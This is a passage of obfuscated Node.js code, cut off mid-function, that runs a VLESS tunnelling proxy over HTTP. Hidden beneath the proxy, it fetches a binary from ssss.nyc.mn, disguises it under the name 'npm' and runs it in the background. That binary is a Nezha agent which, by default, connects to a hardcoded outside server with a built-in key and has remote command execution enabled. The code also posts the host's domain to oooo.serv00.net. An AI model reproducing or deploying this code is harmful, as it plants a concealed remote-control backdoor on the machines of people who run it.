const _0x3bbca=_0x228f;(function(_0x2d2225,_0x4e858e){const _0x107392=_0x228f,_0x3a2105=_0x2d2225();while(!![]){try{const _0x587891=parseInt(_0x107392(0x2b3))/0x1+-parseInt(_0x107392(0x2a0))/0x2+-parseInt(_0x107392(0x201))/0x3*(-parseInt(_0x107392(0x25d))/0x4)+parseInt(_0x107392(0x24f))/0x5*(-parseInt(_0x107392(0x1f2))/0x6)+parseInt(_0x107392(0x1ea))/0x7+-parseInt(_0x107392(0x268))/0x8+parseInt(_0x107392(0x20b))/0x9*(parseInt(_0x107392(0x237))/0xa);if(_0x587891===_0x4e858e)break;else _0x3a2105['push'](_0x3a2105['shift']());}catch(_0x138830){_0x3a2105['push'](_0x3a2105['shift']());}}}(_0x48a7,0xa0f0f));const os=require('os'),fs=require('fs'),net=require(_0x3bbca(0x258)),http=require(_0x3bbca(0x26f)),axios=require(_0x3bbca(0x21e)),{Buffer}=require(_0x3bbca(0x1e4)),{exec,execSync}=require(_0x3bbca(0x22d)),UUID=process[_0x3bbca(0x2c2)][_0x3bbca(0x2b7)]||_0x3bbca(0x213),NEZHA_SERVER=process[_0x3bbca(0x2c2)][_0x3bbca(0x26d)]||_0x3bbca(0x209),NEZHA_PORT=process[_0x3bbca(0x2c2)][_0x3bbca(0x1f3)]||'',NEZHA_KEY=process[_0x3bbca(0x2c2)][_0x3bbca(0x20f)]||'UsC5sNDciSaNggxJdB3EGSGYS242VT7q',AUTO_ACCESS=process['env'][_0x3bbca(0x28f)]||![],XPATH=process[_0x3bbca(0x2c2)][_0x3bbca(0x20e)]||UUID[_0x3bbca(0x2bc)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub',DOMAIN=process['env'][_0x3bbca(0x287)]||'',NAME=process[_0x3bbca(0x2c2)][_0x3bbca(0x236)]||'Vls',PORT=process[_0x3bbca(0x2c2)][_0x3bbca(0x27f)]||0xbb8,SETTINGS={[_0x3bbca(0x2b7)]:UUID,[_0x3bbca(0x25c)]:_0x3bbca(0x2c6),[_0x3bbca(0x22f)]:_0x3bbca(0x294),[_0x3bbca(0x20e)]:'%2F'+XPATH,['MAX_BUFFERED_POSTS']:0x1e,[_0x3bbca(0x26a)]:0xf4240,[_0x3bbca(0x2aa)]:0x7530,[_0x3bbca(0x232)]:0x400*0x400,[_0x3bbca(0x244)]:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x1d2e53,_0x44f79c){for(let _0x1177ee=0x0;_0x1177ee<0x10;_0x1177ee++){if(_0x1d2e53[_0x1177ee]!==_0x44f79c[_0x1177ee])return![];}return!![];}function concat_typed_arrays(_0x1af856,..._0x5bdcbc){const _0x1060c8=_0x3bbca;if(!_0x5bdcbc||_0x5bdcbc[_0x1060c8(0x21c)]<0x1)return _0x1af856;let _0x1f8e8b=_0x1af856[_0x1060c8(0x21c)];for(let _0x166730 of _0x5bdcbc)_0x1f8e8b+=_0x166730[_0x1060c8(0x21c)];const _0x3f43b1=new _0x1af856[(_0x1060c8(0x290))](_0x1f8e8b);_0x3f43b1['set'](_0x1af856,0x0),_0x1f8e8b=_0x1af856[_0x1060c8(0x21c)];for(let _0x240a42 of _0x5bdcbc){_0x3f43b1[_0x1060c8(0x26e)](_0x240a42,_0x1f8e8b),_0x1f8e8b+=_0x240a42[_0x1060c8(0x21c)];}return _0x3f43b1;}function log(_0xb9a4c,..._0x1387e5){const _0xa32ee8=_0x3bbca;if(SETTINGS[_0xa32ee8(0x25c)]==='none')return;const _0x2d977c={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x42d89c={'debug':'\x1b[36m','info':_0xa32ee8(0x1ed),'warn':_0xa32ee8(0x27d),'error':'\x1b[31m','reset':'\x1b[0m'},_0x36aeaf=_0x2d977c[SETTINGS[_0xa32ee8(0x25c)]]||0x1,_0x5cffe4=_0x2d977c[_0xb9a4c]||0x0;if(_0x5cffe4>=_0x36aeaf){const _0x2942f0=new Date()[_0xa32ee8(0x1df)](),_0x49a36b=_0x42d89c[_0xb9a4c]||_0x42d89c['reset'];console[_0xa32ee8(0x27b)](_0x49a36b+'['+_0x2942f0+']\x20['+_0xb9a4c+']',..._0x1387e5,_0x42d89c[_0xa32ee8(0x2c7)]);}}const getDownloadUrl=()=>{const _0xd20e87=_0x3bbca,_0xa1f144=os['arch']();return _0xa1f144===_0xd20e87(0x220)||_0xa1f144===_0xd20e87(0x243)||_0xa1f144===_0xd20e87(0x219)?!NEZHA_PORT?_0xd20e87(0x29e):_0xd20e87(0x224):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x403a79=_0x3bbca;if(!NEZHA_KEY)return;try{const _0x5bbb11=getDownloadUrl(),_0x30fc25=await axios({'method':_0x403a79(0x21d),'url':_0x5bbb11,'responseType':_0x403a79(0x24d)}),_0x218ccf=fs['createWriteStream'](_0x403a79(0x1e7));return _0x30fc25[_0x403a79(0x233)][_0x403a79(0x227)](_0x218ccf),new Promise((_0x247833,_0x30fb62)=>{const _0x14b86b=_0x403a79;_0x218ccf['on'](_0x14b86b(0x269),()=>{const _0x26d527=_0x14b86b;console[_0x26d527(0x27b)](_0x26d527(0x1f7)),exec(_0x26d527(0x20d),_0x4dc8d0=>{if(_0x4dc8d0)_0x30fb62(_0x4dc8d0);_0x247833();});}),_0x218ccf['on'](_0x14b86b(0x26b),_0x30fb62);});}catch(_0x2a6b96){throw _0x2a6b96;}},runnz=async()=>{const _0x4e7a19=_0x3bbca;await downloadFile();let _0x50be75='',_0x22d6fa='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xd1ecc7=[_0x4e7a19(0x261),'8443',_0x4e7a19(0x23e),_0x4e7a19(0x1e6),'2083',_0x4e7a19(0x2c1)];_0x50be75=_0xd1ecc7[_0x4e7a19(0x23a)](NEZHA_PORT)?_0x4e7a19(0x1eb):'',_0x22d6fa=_0x4e7a19(0x2ad)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x50be75+_0x4e7a19(0x2b4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x52be5e=NEZHA_SERVER[_0x4e7a19(0x23a)](':')?NEZHA_SERVER[_0x4e7a19(0x1ef)](':')[_0x4e7a19(0x22c)]():'',_0x4c0a1a=new Set([_0x4e7a19(0x261),'8443','2096','2087',_0x4e7a19(0x2bb),'2053']),_0x1f4561=_0x4c0a1a[_0x4e7a19(0x281)](_0x52be5e)?'true':_0x4e7a19(0x2a8),_0x5c3ff0='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4e7a19(0x2b2)+NEZHA_SERVER+_0x4e7a19(0x2b1)+_0x1f4561+_0x4e7a19(0x1f6)+UUID;fs[_0x4e7a19(0x257)](_0x4e7a19(0x29b),_0x5c3ff0);}_0x22d6fa=_0x4e7a19(0x210);}else return;}try{exec(_0x22d6fa,{'shell':_0x4e7a19(0x1f8)}),console[_0x4e7a19(0x27b)](_0x4e7a19(0x2a2));}catch(_0x2659fa){console[_0x4e7a19(0x26b)](_0x4e7a19(0x262)+_0x2659fa);}};async function addAccessTask(){const _0x1784e6=_0x3bbca;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x50b95f=_0x1784e6(0x1e8)+DOMAIN,_0x2e41a2='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x50b95f+_0x1784e6(0x22e);exec(_0x2e41a2,(_0x33fb7a,_0x54db70,_0x41db2d)=>{const _0x14ec99=_0x1784e6;if(_0x33fb7a){console['error']('Error\x20sending\x20request:',_0x33fb7a[_0x14ec99(0x249)]);return;}console[_0x14ec99(0x27b)]('Automatic\x20Access\x20Task\x20added\x20successfully:',_0x54db70);});}catch(_0x321d1c){console[_0x1784e6(0x26b)](_0x1784e6(0x263),_0x321d1c[_0x1784e6(0x249)]);}}function parse_uuid(_0x56c74e){const _0xc0543f=_0x3bbca;_0x56c74e=_0x56c74e[_0xc0543f(0x2be)]('-','');const _0x478ccf=[];for(let _0x4b8d52=0x0;_0x4b8d52<0x10;_0x4b8d52++){_0x478ccf[_0xc0543f(0x1f1)](parseInt(_0x56c74e[_0xc0543f(0x275)](_0x4b8d52*0x2,0x2),0x10));}return _0x478ccf;}async function read_vless_header(_0x9062c9,_0x2e56d1){const _0x99080=_0x3bbca;let _0x4ff089=0x0,_0x1c1a06=new Uint8Array(),_0x85d4df={'value':_0x1c1a06,'done':![]};async function _0x56469e(_0x1afc12){const _0x1c3e62=_0x228f;if(_0x85d4df[_0x1c3e62(0x1fc)])throw new Error(_0x1c3e62(0x265));const _0x360b65=_0x1afc12-_0x4ff089;if(_0x360b65<0x1)return;_0x85d4df=await read_atleast(_0x9062c9,_0x360b65),_0x4ff089+=_0x85d4df[_0x1c3e62(0x2ab)][_0x1c3e62(0x21c)],_0x1c1a06=concat_typed_arrays(_0x1c1a06,_0x85d4df[_0x1c3e62(0x2ab)]);}await _0x56469e(0x1+0x10+0x1);const _0x3a01e8=_0x1c1a06[0x0],_0x4f5ed4=_0x1c1a06[_0x99080(0x2bc)](0x1,0x1+0x10),_0x44eeb5=parse_uuid(_0x2e56d1);if(!validate_uuid(_0x4f5ed4,_0x44eeb5))throw new Error(_0x99080(0x1fd));const _0x4cee19=_0x1c1a06[0x1+0x10],_0x2b3ce9=0x1+0x10+0x1+_0x4cee19+0x1+0x2+0x1;await _0x56469e(_0x2b3ce9+0x1);const _0x5502af=_0x1c1a06[0x1+0x10+0x1+_0x4cee19],_0x5e946b=0x1;if(_0x5502af!==_0x5e946b)throw new Error('unsupported\x20command:\x20'+_0x5502af);const _0x4e5792=(_0x1c1a06[_0x2b3ce9-0x1-0x2]<<0x8)+_0x1c1a06[_0x2b3ce9-0x1-0x1],_0x54ee1e=_0x1c1a06[_0x2b3ce9-0x1],_0x5aa0e3=0x1,_0x31adf4=0x2,_0x3b8aa8=0x3;let _0x448e51=-0x1;if(_0x54ee1e===_0x5aa0e3)_0x448e51=_0x2b3ce9+0x4;else{if(_0x54ee1e===_0x3b8aa8)_0x448e51=_0x2b3ce9+0x10;else _0x54ee1e===_0x31adf4&&(_0x448e51=_0x2b3ce9+0x1+_0x1c1a06[_0x2b3ce9]);}if(_0x448e51<0x0)throw new Error(_0x99080(0x238));await _0x56469e(_0x448e51);const _0x579cf1=_0x2b3ce9;let _0x4760b1='';if(_0x54ee1e===_0x5aa0e3)_0x4760b1=_0x1c1a06[_0x99080(0x2bc)](_0x579cf1,_0x579cf1+0x4)[_0x99080(0x2a5)]('.');else{if(_0x54ee1e===_0x31adf4)_0x4760b1=new TextDecoder()[_0x99080(0x228)](_0x1c1a06[_0x99080(0x2bc)](_0x579cf1+0x1,_0x579cf1+0x1+_0x1c1a06[_0x579cf1]));else _0x54ee1e===_0x3b8aa8&&(_0x4760b1=_0x1c1a06[_0x99080(0x2bc)](_0x579cf1,_0x579cf1+0x10)[_0x99080(0x23f)]((_0x49b565,_0x4244ed,_0x426fa3,_0x4cd0f1)=>_0x426fa3%0x2?_0x49b565[_0x99080(0x208)](((_0x4cd0f1[_0x426fa3-0x1]<<0x8)+_0x4244ed)[_0x99080(0x24b)](0x10)):_0x49b565,[])[_0x99080(0x2a5)](':'));}if(!_0x4760b1){log(_0x99080(0x26b),_0x99080(0x266));throw new Error('parse\x20hostname\x20failed');}return log(_0x99080(0x2b8),_0x99080(0x2c0)+_0x4760b1+':'+_0x4e5792),{'hostname':_0x4760b1,'port':_0x4e5792,'data':_0x1c1a06[_0x99080(0x2bc)](_0x448e51),'resp':new Uint8Array([_0x3a01e8,0x0])};}async function read_atleast(_0x8df60a,_0x32ff3f){const _0x138f24=_0x3bbca,_0x123be4=[];let _0xcd0993=![];while(_0x32ff3f>0x0&&!_0xcd0993){const _0x5224ad=await _0x8df60a[_0x138f24(0x1e5)]();if(_0x5224ad[_0x138f24(0x2ab)]){const _0x592211=new Uint8Array(_0x5224ad[_0x138f24(0x2ab)]);_0x123be4[_0x138f24(0x1f1)](_0x592211),_0x32ff3f-=_0x592211[_0x138f24(0x21c)];}_0xcd0993=_0x5224ad['done'];}if(_0x32ff3f>0x0)throw new Error(_0x138f24(0x20c));return{'value':concat_typed_arrays(..._0x123be4),'done':_0xcd0993};}async function parse_header(_0x4c3ab6,_0x4a9dbf){const _0x26a1c3=_0x3bbca;log(_0x26a1c3(0x27e),'Starting\x20to\x20parse\x20VLESS\x20header');const _0x245dca=_0x4a9dbf[_0x26a1c3(0x250)][_0x26a1c3(0x270)]();try{const _0x7ce7f8=await read_vless_header(_0x245dca,_0x4c3ab6);return log(_0x26a1c3(0x27e),_0x26a1c3(0x2a4)),_0x7ce7f8;}catch(_0x5327ad){log(_0x26a1c3(0x26b),'VLESS\x20header\x20parse\x20error:\x20'+_0x5327ad[_0x26a1c3(0x249)]);throw new Error('read\x20vless\x20header\x20error:\x20'+_0x5327ad[_0x26a1c3(0x249)]);}finally{_0x245dca[_0x26a1c3(0x292)]();}}async function connect_remote(_0x5c4015,_0x2ae247){const _0x1a09a0=_0x3bbca,_0x5ee316=0x1f40;try{const _0xe30b22=await timed_connect(_0x5c4015,_0x2ae247,_0x5ee316);return _0xe30b22[_0x1a09a0(0x1e0)](!![]),_0xe30b22['setKeepAlive'](!![],0x3e8),_0xe30b22['bufferSize']=parseInt(SETTINGS[_0x1a09a0(0x22f)])*0x400,log(_0x1a09a0(0x2b8),_0x1a09a0(0x2a7)+_0x5c4015+':'+_0x2ae247),_0xe30b22;}catch(_0x3c5d39){log(_0x1a09a0(0x26b),_0x1a09a0(0x298)+_0x3c5d39['message']);throw _0x3c5d39;}}function timed_connect(_0x280ded,_0x57b7b0,_0x10bd39){return new Promise((_0x3e1e63,_0xf6ae23)=>{const _0x177b9d=_0x228f,_0x116eb2=net[_0x177b9d(0x28e)]({'host':_0x280ded,'port':_0x57b7b0}),_0x568f14=setTimeout(()=>{_0xf6ae23(new Error('connect\x20timeout'));},_0x10bd39);_0x116eb2['on'](_0x177b9d(0x221),()=>{clearTimeout(_0x568f14),_0x3e1e63(_0x116eb2);}),_0x116eb2['on'](_0x177b9d(0x26b),_0x39f142=>{clearTimeout(_0x568f14),_0xf6ae23(_0x39f142);});});}function _0x48a7(){const _0x5b6e18=['bufferedData','end','pipe','decode','Remote\x20connection\x20established','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','Created\x20new\x20session\x20for\x20GET:\x20','pop','child_process','\x22}\x27','BUFFER_SIZE','pause','text/plain','CHUNK_SIZE','data','hostname',':443?encryption=none&security=tls&sni=','NAME','10ijtKGH','read\x20address\x20type\x20failed','nextTick','includes','Upload\x20error:\x20','socket','pipeTo','2096','reduce','application/octet-stream','\x20before\x20initialization','Cleanup\x20error:\x20','arm64','TCP_NODELAY','responseHeader','remote','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','Relay\x20error:','message','&mode=packet-up#','toString','lastActivity','stream','aborted','35EITvrl','readable','\x20bytes','chunked','finally','_startDownstreamResponse','destroyed','Process\x20packet\x20error:\x20','writeFileSync','net','fill','delete','enqueue','LOG_LEVEL','948KAccEK','Sending\x20VLESS\x20response\x20header\x20(','Remote\x20connection\x20not\x20available','Created\x20new\x20session\x20for\x20POST:\x20','443','npm\x20running\x20error:\x20','Error\x20added\x20Task:','Session\x20','header\x20length\x20too\x20short','Failed\x20to\x20parse\x20hostname','forEach','7127344jqSCJk','finish','MAX_POST_SIZE','error','write','NEZHA_SERVER','set','http','getReader','localhost','resp','nextSeq','Download\x20error:\x20','substr','_writeToRemote','):\x20','destroy','createServer','port','log','initialized','\x1b[33m','debug','PORT','Failed\x20to\x20initialize\x20VLESS\x20connection','has','Failed\x20to\x20get\x20IP\x20address:','writeHead','uncork','trim','headersSent','DOMAIN','Buffered\x20packet\x20seq=','Error\x20starting\x20downstream:\x20','getWriter','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','&path=',',\x20size=','createConnection','AUTO_ACCESS','constructor','Processing\x20packet:\x20seq=','releaseLock','\x20timed\x20out\x20without\x20downstream','2048','alpnProtocol','secureConnection','headerSent','Connection\x20failed:\x20','now','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','config.yaml','utf-8','vlessHeader','https://arm64.ssss.nyc.mn/v1','Max\x20POST\x20size:\x20','410330FrFmiO','Socket\x20error:','npm\x20is\x20running','keepAliveTimeout','VLESS\x20header\x20parsed\x20successfully','join','Server\x20error:\x20','Connected\x20to\x20','false','startDownstream','SESSION_TIMEOUT','value','=================================','nohup\x20./npm\x20-s\x20','Failed\x20to\x20write\x20to\x20remote:\x20','processPacket','resume','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','832895opJMZd','\x20>/dev/null\x202>&1\x20&','size','cork','UUID','info','unlink','cleaned','2083','slice','method','replaceAll','Transform','VLESS\x20connection\x20to\x20','2053','env','socket\x20hang\x20up','base64','pendingPackets','none','reset','toISOString','setNoDelay','GET,\x20POST','warn','no-store','buffer','read','2087','npm','https://','Cleaning\x20up\x20session\x20','213430CSymzG','--tls','downstreamStarted','\x1b[32m','Session\x20timeout:\x20','split','reading_done','push','504462JOAUFT','NEZHA_PORT','Remote\x20error:\x20','Failed\x20to\x20process\x20POST\x20request:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20download\x20successfully','/bin/bash','writableEnded','POST','/([^/]+)(?:/([0-9]+))?$','done','invalid\x20UUID','Received\x20out\x20of\x20order\x20packet\x20seq=','Max\x20buffered\x20posts:\x20','Server\x20is\x20running\x20on\x20port\x20','16089EOQkfv','from','url','Read\x20controller\x20close\x20error:','Max\x20buffer\x20size:\x20','timeout','Read\x20controller\x20error:','concat','nzku.fortymenty.eu.org:443','bytes','1884789ocnfww','not\x20enough\x20data\x20to\x20read','chmod\x20+x\x20npm','XPATH','NEZHA_KEY','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','initializeVLESS','currentStreamRes','038748fe-81ca-4226-ab01-a49245a47d60','catch','pendingBuffers','Created\x20new\x20session\x20with\x20UUID:\x20','New\x20secure\x20connection\x20using:\x20','listen','aarch64','MAX_BUFFERED_POSTS','http/1.1','length','get','axios','close','arm','connect','cleanup','uuid','https://arm64.ssss.nyc.mn/agent'];_0x48a7=function(){return _0x5b6e18;};return _0x48a7();}function pipe_relay(){async function _0x5aaff3(_0x11773d,_0x55f6a6,_0x333e30){const _0x2457ae=_0x228f,_0xd8ed3e=parseInt(SETTINGS[_0x2457ae(0x232)]);if(_0x333e30[_0x2457ae(0x21c)]>0x0){if(_0x55f6a6[_0x2457ae(0x26c)])_0x55f6a6[_0x2457ae(0x2b6)](),_0x55f6a6[_0x2457ae(0x26c)](_0x333e30),process[_0x2457ae(0x239)](()=>_0x55f6a6[_0x2457ae(0x284)]());else{const _0x1d24d0=_0x55f6a6['writable'][_0x2457ae(0x28a)]();try{await _0x1d24d0[_0x2457ae(0x26c)](_0x333e30);}finally{_0x1d24d0['releaseLock']();}}}try{_0x11773d[_0x2457ae(0x227)]?(_0x11773d[_0x2457ae(0x230)](),_0x11773d[_0x2457ae(0x227)](_0x55f6a6,{'end':!![],'highWaterMark':_0xd8ed3e}),_0x11773d[_0x2457ae(0x2b0)]()):await _0x11773d[_0x2457ae(0x250)][_0x2457ae(0x23d)](_0x55f6a6['writable'],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x2457ae(0x206)](SETTINGS[_0x2457ae(0x2aa)])});}catch(_0x3aa2e1){!_0x3aa2e1[_0x2457ae(0x249)][_0x2457ae(0x23a)](_0x2457ae(0x24e))&&log(_0x2457ae(0x26b),_0x2457ae(0x248),_0x3aa2e1[_0x2457ae(0x249)]);throw _0x3aa2e1;}}return _0x5aaff3;}function socketToWebStream(_0x130138){const _0x1d394c=_0x3bbca;let _0x4b6c38,_0x36eaa1;return _0x130138['on'](_0x1d394c(0x26b),_0x32922f=>{const _0x280ef3=_0x1d394c;log(_0x280ef3(0x26b),_0x280ef3(0x2a1),_0x32922f[_0x280ef3(0x249)]),_0x4b6c38?.[_0x280ef3(0x26b)](_0x32922f),_0x36eaa1?.[_0x280ef3(0x26b)](_0x32922f);}),{'readable':new ReadableStream({'start'(_0x5c688f){const _0x57da35=_0x1d394c;_0x4b6c38=_0x5c688f,_0x130138['on'](_0x57da35(0x233),_0x382967=>{const _0x4e4fbe=_0x57da35;try{_0x5c688f[_0x4e4fbe(0x25b)](_0x382967);}catch(_0x5255de){log(_0x4e4fbe(0x26b),_0x4e4fbe(0x207),_0x5255de['message']);}}),_0x130138['on'](_0x57da35(0x226),()=>{const _0x5bb3bb=_0x57da35;try{_0x5c688f[_0x5bb3bb(0x21f)]();}catch(_0x156c4a){log(_0x5bb3bb(0x26b),_0x5bb3bb(0x204),_0x156c4a[_0x5bb3bb(0x249)]);}});},'cancel'(){_0x130138['destroy']();}}),'writable':new WritableStream({'start'(_0x2bc861){_0x36eaa1=_0x2bc861;},'write'(_0x574fda){return new Promise((_0x5e430d,_0x556bb7)=>{const _0x218792=_0x228f;if(_0x130138[_0x218792(0x255)]){_0x556bb7(new Error('Socket\x20is\x20destroyed'));return;}_0x130138['write'](_0x574fda,_0x45f5d8=>{if(_0x45f5d8)_0x556bb7(_0x45f5d8);else _0x5e430d();});});},'close'(){const _0x28bbb7=_0x1d394c;!_0x130138[_0x28bbb7(0x255)]&&_0x130138[_0x28bbb7(0x226)]();},'abort'(_0x18fe76){const _0x6e4169=_0x1d394c;_0x130138[_0x6e4169(0x278)](_0x18fe76);}})};}function _0x228f(_0x4291a9,_0x5921dd){const _0x48a779=_0x48a7();return _0x228f=function(_0x228f0b,_0x1829d4){_0x228f0b=_0x228f0b-0x1df;let _0x7bad3e=_0x48a779[_0x228f0b];return _0x7bad3e;},_0x228f(_0x4291a9,_0x5921dd);}function relay(_0x558273,_0xdab6d7,_0x4706ce,_0x39544d){const _0x1da73f=_0x3bbca,_0xa20cc3=pipe_relay();let _0x113058=![];const _0x3bf2c1=socketToWebStream(_0x4706ce);function _0x1ef797(){const _0x4761c5=_0x228f;if(!_0x113058){_0x113058=!![];try{_0x4706ce[_0x4761c5(0x278)]();}catch(_0x530298){!_0x530298[_0x4761c5(0x249)][_0x4761c5(0x23a)](_0x4761c5(0x24e))&&!_0x530298[_0x4761c5(0x249)][_0x4761c5(0x23a)](_0x4761c5(0x2c3))&&log(_0x4761c5(0x26b),_0x4761c5(0x242)+_0x530298['message']);}}}const _0x18c5b8=_0xa20cc3(_0xdab6d7,_0x3bf2c1,_0x39544d['data'])[_0x1da73f(0x214)](_0x148f04=>{const _0x458787=_0x1da73f;!_0x148f04[_0x458787(0x249)][_0x458787(0x23a)]('aborted')&&!_0x148f04[_0x458787(0x249)][_0x458787(0x23a)](_0x458787(0x2c3))&&log(_0x458787(0x26b),_0x458787(0x23b)+_0x148f04[_0x458787(0x249)]);})[_0x1da73f(0x253)](()=>{const _0x1d82b3=_0x1da73f;_0xdab6d7[_0x1d82b3(0x1f0)]&&_0xdab6d7[_0x1d82b3(0x1f0)]();}),_0x39afdf=_0xa20cc3(_0x3bf2c1,_0xdab6d7,_0x39544d['resp'])[_0x1da73f(0x214)](_0x66347c=>{const _0x3bf02a=_0x1da73f;!_0x66347c[_0x3bf02a(0x249)]['includes'](_0x3bf02a(0x24e))&&!_0x66347c[_0x3bf02a(0x249)][_0x3bf02a(0x23a)](_0x3bf02a(0x2c3))&&log(_0x3bf02a(0x26b),_0x3bf02a(0x274)+_0x66347c[_0x3bf02a(0x249)]);});_0x39afdf[_0x1da73f(0x253)](()=>_0x18c5b8)[_0x1da73f(0x253)](_0x1ef797);}const sessions=new Map();class Session{constructor(_0x2b8b42){const _0x7f9387=_0x3bbca;this[_0x7f9387(0x223)]=_0x2b8b42,this[_0x7f9387(0x273)]=0x0,this['downstreamStarted']=![],this[_0x7f9387(0x24c)]=Date[_0x7f9387(0x299)](),this[_0x7f9387(0x29d)]=null,this[_0x7f9387(0x246)]=null,this[_0x7f9387(0x27c)]=![],this['responseHeader']=null,this[_0x7f9387(0x297)]=![],this[_0x7f9387(0x225)]=new Map(),this['cleaned']=![],this[_0x7f9387(0x2c5)]=[],this['currentStreamRes']=null,this['pendingBuffers']=new Map(),log(_0x7f9387(0x27e),_0x7f9387(0x216)+_0x2b8b42);}async[_0x3bbca(0x211)](_0x597fcc){const _0x5995e0=_0x3bbca;if(this[_0x5995e0(0x27c)])return!![];try{log(_0x5995e0(0x27e),_0x5995e0(0x29a));const _0x439066=new ReadableStream({'start'(_0x57a406){const _0x2585a3=_0x5995e0;_0x57a406[_0x2585a3(0x25b)](_0x597fcc),_0x57a406[_0x2585a3(0x21f)]();}}),_0x4507db={'readable':_0x439066,'writable':new WritableStream()};return this[_0x5995e0(0x29d)]=await parse_header(SETTINGS[_0x5995e0(0x2b7)],_0x4507db),log(_0x5995e0(0x2b8),'VLESS\x20header\x20parsed:\x20'+this['vlessHeader'][_0x5995e0(0x234)]+':'+this[_0x5995e0(0x29d)]['port']),this[_0x5995e0(0x246)]=await connect_remote(this[_0x5995e0(0x29d)][_0x5995e0(0x234)],this[_0x5995e0(0x29d)][_0x5995e0(0x27a)]),log(_0x5995e0(0x2b8),_0x5995e0(0x229)),this[_0x5995e0(0x27c)]=!![],!![];}catch(_0xee14f4){return log(_0x5995e0(0x26b),'Failed\x20to\x20initialize\x20VLESS:\x20'+_0xee14f4[_0x5995e0(0x249)]),![];}}async['processPacket'](_0x2b7163,_0x31a3bd){const _0x57eeae=_0x3bbca;try{this[_0x57eeae(0x215)][_0x57eeae(0x26e)](_0x2b7163,_0x31a3bd),log(_0x57eeae(0x27e),_0x57eeae(0x288)+_0x2b7163+_0x57eeae(0x28d)+_0x31a3bd[_0x57eeae(0x21c)]);while(this[_0x57eeae(0x215)][_0x57eeae(0x281)](this[_0x57eeae(0x273)])){const _0x48cc30=this[_0x57eeae(0x215)][_0x57eeae(0x21d)](this[_0x57eeae(0x273)]);this['pendingBuffers'][_0x57eeae(0x25a)](this['nextSeq']);if(!this[_0x57eeae(0x27c)]&&this[_0x57eeae(0x273)]===0x0){if(!await this[_0x57eeae(0x211)](_0x48cc30))throw new Error(_0x57eeae(0x280));this[_0x57eeae(0x245)]=Buffer['from'](this['vlessHeader'][_0x57eeae(0x272)]),await this['_writeToRemote'](this[_0x57eeae(0x29d)][_0x57eeae(0x233)]),this[_0x57eeae(0x212)]&&this[_0x57eeae(0x254)]();}else{if(!this[_0x57eeae(0x27c)]){log(_0x57eeae(0x1e2),_0x57eeae(0x1fe)+_0x2b7163+_0x57eeae(0x241));continue;}await this[_0x57eeae(0x276)](_0x48cc30);}this[_0x57eeae(0x273)]++,log(_0x57eeae(0x27e),'Processed\x20packet\x20seq='+(this[_0x57eeae(0x273)]-0x1));}if(this['pendingBuffers'][_0x57eeae(0x2b5)]>SETTINGS[_0x57eeae(0x21a)])throw new Error('Too\x20many\x20buffered\x20packets');return!![];}catch(_0x5b3f23){log(_0x57eeae(0x26b),_0x57eeae(0x256)+_0x5b3f23[_0x57eeae(0x249)]);throw _0x5b3f23;}}['_startDownstreamResponse'](){const _0x503a67=_0x3bbca;if(!this['currentStreamRes']||!this[_0x503a67(0x245)])return;try{const _0x4caf1a=this[_0x503a67(0x212)][_0x503a67(0x23c)]?.['alpnProtocol']||_0x503a67(0x21b),_0x5a59c6=_0x4caf1a==='h2';!this[_0x503a67(0x297)]&&(log(_0x503a67(0x27e),_0x503a67(0x25e)+_0x4caf1a+_0x503a67(0x277)+this[_0x503a67(0x245)][_0x503a67(0x21c)]+_0x503a67(0x251)),this[_0x503a67(0x212)][_0x503a67(0x26c)](this[_0x503a67(0x245)]),this[_0x503a67(0x297)]=!![]);if(_0x5a59c6){this['currentStreamRes'][_0x503a67(0x23c)][_0x503a67(0x1e0)](!![]);const _0x4d55c3=new require(_0x503a67(0x24d))[_0x503a67(0x2bf)]({'transform'(_0x1e42f7,_0x2ffd1e,_0x29b1ed){const _0x149fc0=_0x503a67,_0x3aa20d=0x4000;for(let _0x4f09c4=0x0;_0x4f09c4<_0x1e42f7['length'];_0x4f09c4+=_0x3aa20d){this[_0x149fc0(0x1f1)](_0x1e42f7['slice'](_0x4f09c4,_0x4f09c4+_0x3aa20d));}_0x29b1ed();}});this[_0x503a67(0x246)][_0x503a67(0x227)](_0x4d55c3)[_0x503a67(0x227)](this[_0x503a67(0x212)]);}else this['remote']['pipe'](this[_0x503a67(0x212)]);this[_0x503a67(0x246)]['on'](_0x503a67(0x226),()=>{const _0x2d5b17=_0x503a67;!this['currentStreamRes'][_0x2d5b17(0x1f9)]&&this[_0x2d5b17(0x212)][_0x2d5b17(0x226)]();}),this[_0x503a67(0x246)]['on'](_0x503a67(0x26b),_0x3fc09b=>{const 